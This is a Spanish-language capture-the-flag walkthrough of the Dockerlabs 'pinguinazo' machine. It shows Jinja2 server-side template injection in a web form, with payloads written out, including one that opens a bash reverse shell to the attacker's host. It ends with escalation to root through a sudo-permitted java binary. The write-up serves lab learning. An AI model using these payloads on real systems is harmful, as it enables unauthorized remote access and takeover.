Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh pinguinazo.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>La dirección IP de la máquina a vulnerar siempre es la 172.17.0.2</ins>.

  ![image](https://github.com/user-attachments/assets/38162397-79f3-47ca-b931-f8e464a7a7b8)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/801657e1-ad54-495f-b4e0-6b597b43e0cb)

Podemos ver que se encuentra abierto únicamente el puerto ***5000***, correspondiente al servicio ***UPnP*** (Universal Plug and Play).

Vamos a intentar atacar a la máquina víctima mediante UPnP. Para ello, nos podemos dirigir al navegador y en el buscador ponemos http://172.17.0.2:5000.

  ![image](https://github.com/user-attachments/assets/dd69d7fc-ffa1-4181-9df7-8e5f0bc7d83e)

Se nos muestra un formulario de datos de usuario, para registrarnos en la página web del servidor. Algo a resaltar, es que el input del correo no puede editarse.

Probamos a ingresar unos datos aleatorios y enviar el formulario:

  ![image](https://github.com/user-attachments/assets/dfe3ea75-cb44-4687-a508-8058110dfe3e)

Al hacer clic en el botón de "**Save all**" se nos redirige a la dirección http://172.17.0.2:5000/greet y se ve este mensaje:

  ![image](https://github.com/user-attachments/assets/c5b66d38-2e76-4733-b777-27bb2f15d580)

Parece ser que el servidor lee el input del Nombre e interactúa con él, por lo que podríamos realizar un **ataque SSTI** (*Server-Side Template Injection*). Probamos con un código simple:

  ![image](https://github.com/user-attachments/assets/d5bbe711-4cf9-4e6c-8dde-02868e316de0)

  ![image](https://github.com/user-attachments/assets/261ada76-99b4-44e4-b866-ba92d14aad87)

La salida muestra el resultado de la operación matemática, por lo que el formulario es vulnerable.

Accedemos a [esta página web](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) y escribimos la siguiente línea de código:

**{{ cycler.__init__.__globals__.os.popen('id').read() }}**

  ![image](https://github.com/user-attachments/assets/481a5d1b-21e2-4fa9-969c-06f16cf391c4)

  ![image](https://github.com/user-attachments/assets/9ef32c30-7e2c-4c3f-8cc2-c17517271ffe)

Somos el usuario *pinguinazo*, con ID 1001.

Ahora, insertamos este código para realizar una reverse shell:

**{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}**

  ![image](https://github.com/user-attachments/assets/6ce51009-acc6-43ac-a1c7-37d14b00715d)

Nos ponemos en escucha con NetCat por el puerto 443 antes de ejecutarlo.

  ![image](https://github.com/user-attachments/assets/c40e1030-4234-4de2-9a71-bb7ae1614ce8)

Hemos accedido a la máquina víctima como el usuario "**pinguinazo**".

Miramos con el comando **sudo -l** los archivos binarios que puede ejecutar este usuario de manera privilegiada.

  ![image](https://github.com/user-attachments/assets/ce18f397-c6b9-40a5-8d60-38260ed5f57d)

Podemos ejecutar el binario /usr/bin/java como usuario root, sin necesidad de ingresar la contraseña del usuario en la CLI.

Para realizar la escalada de privilegios, creamos un archivo tipo Java que contenga el código de una reverse shell. Para ello, utilizamos la página de [Revshells](https://www.revshells.com/).

  ![image](https://github.com/user-attachments/assets/82af0921-5be5-42af-a370-60ac747a36b9)

  ![image](https://github.com/user-attachments/assets/c6cf4e90-2201-4f00-949e-5b2ae29b6f64)

Nos ponemos en escucha con NetCat por el puerto 443 y ejecutamos el archivo con **sudo /usr/bin/java** [***fichero java***].

  ![image](https://github.com/user-attachments/assets/c0abe717-5fa9-4d5d-83db-a44f2c34f447)

  ![image](https://github.com/user-attachments/assets/42f31f81-559c-4cd6-ba6f-5e7736db9971)

  ![image](https://github.com/user-attachments/assets/455e0da7-e864-4f0d-b96c-3b6a32e291f3)

Finalmente, hemos accedido al sistema como usuario root, por lo que contamos con todos los privilegios existentes.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/60500623-fe36-4cb9-954d-8ffbe897920b)
